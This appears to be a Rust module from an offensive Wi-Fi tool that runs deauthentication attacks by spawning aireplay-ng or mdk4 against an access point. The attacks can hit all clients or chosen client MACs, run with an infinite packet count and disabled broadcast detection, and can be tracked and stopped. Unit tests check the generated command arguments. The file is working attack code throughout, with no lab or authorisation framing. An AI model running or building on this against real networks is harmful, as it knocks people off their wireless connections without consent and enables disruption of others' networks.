use std::collections::HashMap;
use std::process::Stdio;
use std::sync::Mutex;
use tokio::process::Command;
use tokio::task::JoinHandle;
use tracing::{error, info, warn};

use crate::globals::State;
use crate::types::*;


#[derive(thiserror::Error, Debug)]
pub enum DeauthError {
    #[error("IO error: {0}")]
    Io(#[from] std::io::Error),

    #[error("Interface not set - start scan first")]
    NoInterface,

    #[error("Attack already running on: {0}")]
    AlreadyRunning(String),

    #[error("No attack found for: {0}")]
    NotFound(String),

    #[error("Invalid MAC address: {0}")]
    BadMac(String),
}


// bssid → cancellation handles
static ATTACK_HANDLES: std::sync::OnceLock<Mutex<HashMap<String, Vec<JoinHandle<()>>>>> = std::sync::OnceLock::new();

fn attack_handles() -> &'static Mutex<HashMap<String, Vec<JoinHandle<()>>>> {
    ATTACK_HANDLES.get_or_init(|| Mutex::new(HashMap::new()))
}


// Start deauth attack on AP
// If clients is None → broadcast (all clients)
// If clients is Some → targeted (specific MACs)
pub async fn launch_deauth(ap: Ap,clients: Option<Vec<String>>,tool: AttackTool) -> Result<(), DeauthError> {
    let iface = State::get_iface().ok_or(DeauthError::NoInterface)?;

    if State::is_attacking(&ap.bssid) {
        return Err(DeauthError::AlreadyRunning(ap.bssid.clone()));
    }
    info!("launching deauth: bssid={} tool={} targets={:?}",ap.bssid, tool, clients);

    let handles = match clients {
        // targeted attack - one process per client
        Some(client_macs) => {
            let mut hs = vec![];
            for mac in &client_macs {
                let h = spawn_attack_process(&iface, &ap.bssid, Some(mac), &tool).await?;
                hs.push(h);
            }

            // store as selected attack
            let attacked = AttackedClients::Selected(
                client_macs.iter().map(|m| (m.clone(), dummy_child())).collect()
            );
            let entry = AttackEntry::new(ap.clone(), attacked, tool);
            State::add_attack(ap.bssid.clone(), entry);
            hs
        }
        // broadcast - one process for all
        None => {
            let h = spawn_attack_process(&iface, &ap.bssid, None, &tool).await?;
            let attacked = AttackedClients::All(dummy_child());
            let entry = AttackEntry::new(ap.clone(), attacked, tool);
            State::add_attack(ap.bssid.clone(), entry);
            vec![h]
        }
    };

    // store join handles for cancellation
    if let Ok(mut pool) = attack_handles().lock() {
        pool.insert(ap.bssid, handles);
    }

    Ok(())
}

// Spawn one attack subprocess
async fn spawn_attack_process(iface: &str,bssid: &str,client: Option<&str>,tool: &AttackTool) -> Result<JoinHandle<()>, DeauthError> {
    let args = build_attack_args(iface, bssid, client, tool);
    let bin  = tool.binary_name().to_string();
    info!("spawn: {} {}", bin, args.join(" "));
    let mut child = Command::new(&bin).args(&args).stdout(Stdio::null()).stderr(Stdio::null()).kill_on_drop(true).spawn().map_err(DeauthError::Io)?;
    // wrap in task that waits for process
    let handle = tokio::spawn(async move {
        match child.wait().await {
            Ok(status) => info!("{} exited: {}", bin, status),
            Err(e)     => error!("{} wait error: {}", bin, e),
        }
    });
    Ok(handle)
}

// Build CLI args for attack tool
fn build_attack_args(iface: &str,bssid: &str,client: Option<&str>,tool: &AttackTool) -> Vec<String> {
    match tool {
        AttackTool::Aireplay => {
            // aireplay-ng -0 0 -D -a <bssid> [-c <client>] <iface>
            let mut args = vec![
                "-0".into(),   // deauth mode
                "0".into(),    // infinite count
                "-D".into(),   // disable broadcast detection
                "-a".into(), bssid.to_string(),
            ];
            if let Some(mac) = client {
                args.push("-c".into());
                args.push(mac.to_string());
            }
            args.push(iface.to_string());
            args
        }
        AttackTool::Mdk4 => {
            // mdk4 <iface> d -B <bssid> [-S <client>]
            let mut args = vec![
                iface.to_string(),
                "d".into(),
                "-B".into(), bssid.to_string(),
            ];
            if let Some(mac) = client {
                args.push("-S".into());
                args.push(mac.to_string());
            }
            args
        }
    }
}


// Stop attack on specific AP
pub async fn stop_deauth(bssid: &str) -> Result<(), DeauthError> {
    // abort all spawned tasks for this bssid
    if let Ok(mut pool) = attack_handles().lock() {
        if let Some(handles) = pool.remove(bssid) {
            for h in handles {
                h.abort();
            }
        }
    }

    // remove from state
    match State::remove_attack(bssid) {
        Some(_) => {
            info!("deauth stopped: bssid={}", bssid);
            Ok(())
        }
        None => Err(DeauthError::NotFound(bssid.to_string())),
    }
}

// Stop all active attacks
pub async fn stop_all_attacks() {
    let bssids: Vec<String> = {
        attack_handles().lock().map(|p| p.keys().cloned().collect()).unwrap_or_default()
    };

    for bssid in bssids {
        stop_deauth(&bssid).await.ok();
    }
    info!("all attacks stopped");
}


pub fn is_attacking(bssid: &str) -> bool {
    State::is_attacking(bssid)
}

pub fn active_attack_count() -> usize {
    State::attack_count()
}

// dummy placeholder - real process tracked via JoinHandle
fn dummy_child() -> std::process::Child {
    std::process::Command::new("true").spawn().expect("true should always exist")
}


#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_aireplay_args_broadcast() {
        let args = build_attack_args("wlan0mon","AA:BB:CC:DD:EE:FF", None,&AttackTool::Aireplay);
        assert!(args.contains(&"-0".to_string()));
        assert!(args.contains(&"-a".to_string()));
        assert!(args.contains(&"AA:BB:CC:DD:EE:FF".to_string()));
        assert!(!args.contains(&"-c".to_string()));
        assert_eq!(args.last().unwrap(), "wlan0mon");
    }

    #[test]
    fn test_aireplay_args_targeted() {
        let args = build_attack_args("wlan0mon","AA:BB:CC:DD:EE:FF",Some("11:22:33:44:55:66"),&AttackTool::Aireplay);
        assert!(args.contains(&"-c".to_string()));
        assert!(args.contains(&"11:22:33:44:55:66".to_string()));
    }

    #[test]
    fn test_mdk4_args_broadcast() {
        let args = build_attack_args("wlan0mon","AA:BB:CC:DD:EE:FF",None,&AttackTool::Mdk4);
        assert_eq!(args[0], "wlan0mon");
        assert_eq!(args[1], "d");
        assert!(args.contains(&"-B".to_string()));
        assert!(!args.contains(&"-S".to_string()));
    }

    #[test]
    fn test_mdk4_args_targeted() {
        let args = build_attack_args("wlan0mon","AA:BB:CC:DD:EE:FF",Some("11:22:33:44:55:66"),&AttackTool::Mdk4);
        assert!(args.contains(&"-S".to_string()));
        assert!(args.contains(&"11:22:33:44:55:66".to_string()));
    }

    #[test]
    fn test_is_attacking_false_initially() {
        assert!(!is_attacking("AA:BB:CC:DD:EE:FF"));
    }

    #[tokio::test]
    async fn test_stop_nonexistent_attack() {
        let result = stop_deauth("00:00:00:00:00:00").await;
        assert!(matches!(result, Err(DeauthError::NotFound(_))));
    }

    #[tokio::test]
    async fn test_stop_all_no_panic() {
        stop_all_attacks().await;
    }
}